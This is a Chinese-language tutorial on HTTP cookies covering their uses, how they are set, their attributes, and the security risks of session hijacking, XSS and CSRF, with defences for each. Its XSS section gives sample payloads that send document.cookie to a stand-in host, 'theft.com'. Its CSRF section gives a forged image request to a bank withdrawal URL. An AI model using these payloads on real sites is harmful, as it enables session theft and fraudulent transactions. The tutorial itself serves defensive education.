## Cookie用途

**记录会话**

  我们都知道http为无状态协议，即使客户端C上一次请求A告诉服务端S他是谁，下一次请求B到服务端S时，服务端S依然不知道是谁在访问，所以需要一个记录来跟踪用户登录状态，最常用的就是Cookie了，现在也有很多不传送cookie，走http headers进行认证，这样的话可以减少传送一些客户端才需要使用的cookie，节省带宽，而且更安全

**行为分析**

  通过cookie去跟踪用户的轨迹和使用情况，分析这些这些数据，（用户浏览了什么页面和内容/什么时候访问的/在当前页面停留多久/浏览最多的页面/查询最多的关键词等），从而可以定向精准的投放广告服务或者个性化服务，例如谷歌搜索，会记录你每次的搜索关键词，向你推荐相关关键词，了解你的兴趣爱好

## Cookie设置
cookie的设置方式又2种，第一种是由服务端的响应头中添加Set-Cookie，该响应头可以有多个同时存在，如
```js   
HTTP/1.1 200 OK
Content-type: text/html
Set-Cookie: theme=light
Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT; httponly
```
第二种在客户端通过js进行设置，如
```js
document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; path=/; domain=xxx.com; secure;samesite=strict'
```
#### 属性说明

- **expires** => 值为GMT时间字符表示过期的日期点，可以设置该值为过去日期来删除该cookie<br>

- **maxage** => 表示过期的时间长度，单位为S<br>

- **path** => 限制cookie在该路径下，只能在该路径下才能发送<br>

- **domain** => 限制cookie在该域下，可以在该域和子域下发送，如果没有设置则只在该域下发送<br>

- **secure** => 限制只能在https下加密传输<br>

- **samesite** => 控制跨域下请求是否发送cookie,有三个值，分别为none(可以),strict（只在同域下发送站点）,lax（和strict差不多，不过只能通过link这种外部导航方式进入才会发送），默认为lax<br>

- **httponly** => 只通过http暴露cookie,这就表示不能通过js脚本document.cookie设置和访问<br>

#### 注意事项
`1. 没有设置expires或者maxage则默认为会话cookie，浏览器关闭之后则消失，反之为持久cookie`<br>

`2. 没有设置domain或者path则默认只能在当前域或路径下传送cookie`<br>

`3. 删除时，domain和path需要该cookie一致`<br>

`4. httponly只能通过服务端Set-Cookie设置`<br>

`5. 同源策略-不能设置和获取其他域的cookie`<br>
## Cookie安全
### SessionHijacking（会话劫持）
在客户端和服务端之间进行cookie的传输时，网络上的流量可以被发送方以外的网络上的计算机拦截和读取，特别是在未加密开放式的wifi上，通过拦截到的cookie来冒充用户发起恶意行为<br>

- 可以使用https加密传输，同时设置secure只能通过https进行传输<br>
- 随机方式生成会话，或者基于用户信息+时间+ip地址生成会话
### XSS（跨站脚本攻击）
在客户端执行了没有经过过滤的恶意代码将cookie发送到第三方服务器上，即使cookie添加了secure，如果第三方服务器启用了https，一样会被发送,如下代码
```js
 (new image()).src='https://theft.com/transparent.jpg?cookie='+document.cookie;
```
```html
<a href="#" onclick="window.location = 'http://theft.com/stole?cookie=' + encodeURIComponent(document.cookie); return false;">点击</a>
```
**1.杜绝源头**

- 存储时进行转义
- 不要引用来自不受信任域的js文件

**2.执行控制**

- 在输出时先对内容（来自url参数或者ajax）进行转义如（ & < > " ' / javascript:）
- 注意使用eval()、setTimeout()、setInterval()、innerHTML、document.write()等可以执行字符串的代码
- 由服务端通过Set-Cookie设置httponly，使document.cookie无法获取
### CSRF（跨站请求伪造）
代表用户发起一个伪造的请求，假如在一个没有做输入过滤的论坛上接收到一个消息，该消息为如下代码
```html
<img src="http://bank.com/withdraw?account=you&amount=1000000&for=attacker">
```
如果此时你正好登录了bank.com且cookie有效，那该条消息会携带cookie向银行服务器发送一个转账的请求，银行通过cookie发现有效，则会执行转账操作

- 尽量减少敏感cookie失效时间
- 设置SameSite为lax同源策略，跨域时cookie不会被发送
- 敏感请求应该提供再次确认，如收到该请求后告知前端需要滑块验证或者输入用户信息，通过后回传才能继续执行
- 通过请求头origin或者referrer验证请求来源，且改用post方式（虽然请求头可以伪造，但是可以抵挡部分虚假和get请求）
- 不通过cookie进行认证，可添加一个自定义请求头进行认证，其值为动态生成的随机字符串
- 输入和输出过滤
- 在请求中添加cookie对应的token，对比请求中的token和cookie是否一致（cookie同源策略-伪造者不能设置和获取其他域的cookie到token中）
